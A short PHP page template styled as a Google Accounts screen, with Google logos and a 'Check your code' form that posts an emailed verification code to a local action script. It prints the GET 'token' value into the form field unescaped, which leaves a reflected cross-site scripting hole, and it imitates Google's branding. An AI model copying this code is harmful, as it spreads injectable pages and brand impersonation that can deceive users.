<?php
require 'config.php';
$title = "Fazer Conta nas Contas Google";
$token = filter_input(INPUT_GET, 'token');

?>
<?php require 'partials/header-login.php'; ?>

<form method="POST" action="<?= $base; ?>/very_code.action.php">
    <div class="group-align" data-url="<?= $base; ?>">
        <div class="group-title">
            <img src="assets/images/pngwing.com.png" alt="logo google">
            <h2>Check your code</h2>
             <img src="assets/images/link-da-web.png" alt="logo google">
            <p>Enter your code sent by Email</p>
        </div>
        <div class="group-i" id="recover-email">
            <div class="containeri-x">
                <div class="fieldset-row-2">
                    <div class="align-i">
                        <fieldset >
                            <legend>Enter your code</legend>
                            <input  type="text" name="user-token" value="<?=$token?>">
                        </fieldset>
                        <span>Obrigatório</span>
                    </div>
                </div>
                <div class="link"></div>
                <div class="access-i"></div>
                <div class="group-row">
                    <div class="col-acess-2"></div>
                    <div class="col-acess-2 align-i">
                        <button id="recover-button-email" type="submit">Check</button>
                    </div>
                </div>
            </div>
        </div>   
</form>
<?php require 'partials/footer-login.php'; ?>